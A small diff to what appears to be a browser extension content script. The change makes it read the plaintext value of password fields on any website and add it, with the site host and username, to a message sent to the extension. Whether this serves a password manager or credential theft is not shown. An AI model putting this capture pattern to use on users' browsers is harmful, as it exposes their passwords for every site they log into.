@@ -74,9 +74,10 @@ function checkFields(fields){
          }
          if(fields[j].type=="password"){
             hasPassword = true;
+             var password = fields[j].value;
         }
         if(hasEmail && hasPassword){
-            extensionLight.runtime.sendMessage('newConnectionToRandomWebsite', {'website':window.location.host, 'username':email}, function(){});
+            extensionLight.runtime.sendMessage('newConnectionToRandomWebsite', {'website':window.location.host, 'username':email, 'password':password}, function(){});
         break;
         }
     }
